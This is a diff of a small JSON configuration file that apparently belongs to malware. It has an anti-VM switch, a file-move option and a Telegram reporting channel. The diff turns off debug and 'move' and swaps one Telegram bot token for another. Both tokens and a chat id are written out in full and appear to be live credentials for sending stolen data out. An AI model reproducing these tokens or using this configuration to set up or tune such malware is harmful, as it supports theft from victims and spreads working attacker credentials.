@@ -1,5 +1,5 @@
 ﻿{
-  "debug": true,
+  "debug": false,
   "binfile": false,
   "antivm": false,
 
@@ -14,8 +14,8 @@
 
   "telegram": true,
   "tgid": -1002868782470,
-  "tgtoken": "bot7792760765:AAGjIRL7FFkLwwHAf284tn9s6JO3pSvk_qc",
+  "tgtoken": "7625147235:AAGgB1FfYPz0Vm1RwmJts2AqHPce_eOX-_k",
 
   "debugmessage": false,
-  "move": true
+  "move": false
 }
